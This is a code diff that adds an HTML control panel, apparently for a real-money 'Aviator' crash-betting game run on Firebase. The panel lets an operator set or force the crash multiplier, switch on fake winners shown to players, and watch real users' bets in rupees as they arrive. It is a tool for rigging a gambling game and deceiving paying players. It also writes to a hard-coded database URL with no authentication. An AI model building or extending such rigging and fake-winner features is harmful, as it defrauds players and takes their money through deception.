@@ -1,0 +1,91 @@
+<!DOCTYPE html>
+<html lang="hi">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Aviator Master Control</title>
+    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
+    <style>
+        body { background: #0f1011; color: #fff; font-family: sans-serif; padding: 15px; }
+        .card { background: #1b1c1d; border-radius: 12px; padding: 20px; margin-bottom: 15px; border: 1px solid #333; }
+        h2 { color: #d11345; font-size: 18px; margin-bottom: 15px; text-transform: uppercase; border-bottom: 1px solid #333; padding-bottom: 10px; }
+        .grid { display: grid; grid-template-columns: repeat(3, 1fr); gap: 10px; }
+        button { padding: 12px; border-radius: 8px; border: none; font-weight: bold; cursor: pointer; color: #fff; transition: 0.2s; }
+        .btn-blue { background: #3498db; }
+        .btn-danger { background: #e74c3c; grid-column: span 3; }
+        .btn-success { background: #28a745; grid-column: span 3; }
+        .status-box { background: #000; padding: 10px; border-radius: 8px; margin-top: 10px; border: 1px solid #444; }
+        .status-item { display: flex; justify-content: space-between; font-size: 14px; margin: 5px 0; }
+        .val { color: #28a745; font-weight: bold; }
+        .bet-row { display: flex; justify-content: space-between; padding: 8px; background: #252627; margin-top: 5px; border-radius: 5px; font-size: 13px; }
+    </style>
+</head>
+<body>
+
+    <div class="card">
+        <h2>✈️ Crash Control</h2>
+        <div class="grid">
+            <button class="btn-blue" onclick="setCrash(1.10)">1.10x</button>
+            <button class="btn-blue" onclick="setCrash(2.00)">2.00x</button>
+            <button class="btn-blue" onclick="setCrash(5.00)">5.00x</button>
+            <button class="btn-blue" onclick="setCrash(10.0)">10x</button>
+            <button class="btn-blue" onclick="setCrash(20.0)">20x</button>
+            <button class="btn-blue" onclick="setCrash(50.0)">50x</button>
+            <button class="btn-danger" onclick="setCrash(1.00)">FORCE CRASH (1.00x)</button>
+            <button class="btn-success" onclick="resetBot()">RESET TO BOT MODE</button>
+        </div>
+    </div>
+
+    <div class="card">
+        <h2>👥 Fake Traffic</h2>
+        <div class="grid" style="grid-template-columns: 1fr 1fr;">
+            <button style="background:#28a745" onclick="toggleFake(true)">ON Winners</button>
+            <button style="background:#555" onclick="toggleFake(false)">OFF Winners</button>
+        </div>
+        <div class="status-box">
+            <div class="status-item">Fake Status: <span id="fakeStat" class="val">--</span></div>
+            <div class="status-item">Next Crash: <span id="targetStat" class="val">--</span></div>
+        </div>
+    </div>
+
+    <div class="card">
+        <h2>📊 Real-Time Bets</h2>
+        <div id="liveBets">
+            <div style="text-align:center; color:#666; font-size:12px;">Waiting for players...</div>
+        </div>
+    </div>
+
+<script>
+    // Database Config (Same as Game)
+    const firebaseConfig = { databaseURL: "https://jalwa-v2-ad222-default-rtdb.firebaseio.com/" };
+    if (!firebase.apps.length) firebase.initializeApp(firebaseConfig);
+    const db = firebase.database();
+
+    // Controls
+    function setCrash(v) { db.ref('gameSettings/aviator/control').update({ forceActive: true, manualCrash: v }); }
+    function resetBot() { db.ref('gameSettings/aviator/control').update({ forceActive: false, manualCrash: 0 }); }
+    function toggleFake(s) { db.ref('gameSettings/aviator/control').update({ showFakeWinners: s }); }
+
+    // Sync Stats
+    db.ref('gameSettings/aviator/control').on('value', snap => {
+        const d = snap.val() || {};
+        document.getElementById('fakeStat').innerText = d.showFakeWinners ? "ON" : "OFF";
+        document.getElementById('fakeStat').style.color = d.showFakeWinners ? "#28a745" : "#e74c3c";
+        document.getElementById('targetStat').innerText = d.forceActive ? d.manualCrash + "x" : "AUTO (Bot)";
+    });
+
+    // Tracking Real Players
+    db.ref('gameSettings/aviator/liveBets').on('value', snap => {
+        const list = document.getElementById('liveBets');
+        list.innerHTML = "";
+        if(snap.exists()){
+            snap.forEach(child => {
+                const b = child.val();
+                list.innerHTML += `<div class="bet-row"><span>User: ${child.key.split('_')[0]}</span><span class="val">₹${b.amt}</span></div>`;
+            });
+        } else {
+            list.innerHTML = `<div style="text-align:center; color:#666; font-size:12px;">No active bets</div>`;
+        }
+    });
+</script>
